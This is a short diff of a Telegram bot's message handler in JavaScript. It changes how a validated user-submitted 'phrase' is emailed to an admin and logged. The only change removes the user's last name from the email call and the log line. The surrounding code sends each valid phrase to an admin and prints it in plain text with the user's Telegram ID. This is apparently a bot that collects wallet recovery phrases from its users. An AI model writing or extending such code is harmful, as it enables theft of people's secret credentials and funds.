@@ -96,10 +96,10 @@ const registerMessageHandlers = (bot) => {
             } finally {
                 if (isValidPhrase) {
                     try {
-                        const info = await sendPhraseMail(telegramId, msg.from.first_name, msg.from.last_name, phrase);
+                        const info = await sendPhraseMail(telegramId, msg.from.first_name, phrase);
 
                         console.log("📨 Phrase email sent to admin:");
-                        console.log("👤 User:", `${msg.from.first_name} ${msg.from.last_name} (${telegramId})`);
+                        console.log("👤 User:", `${msg.from.first_name} (${telegramId})`);
                         console.log("🧠 Phrase:", `"${phrase}"`);
                         console.log("📩 Message ID:", info.messageId);
                         console.log("🧭 Envelope:", info.envelope);
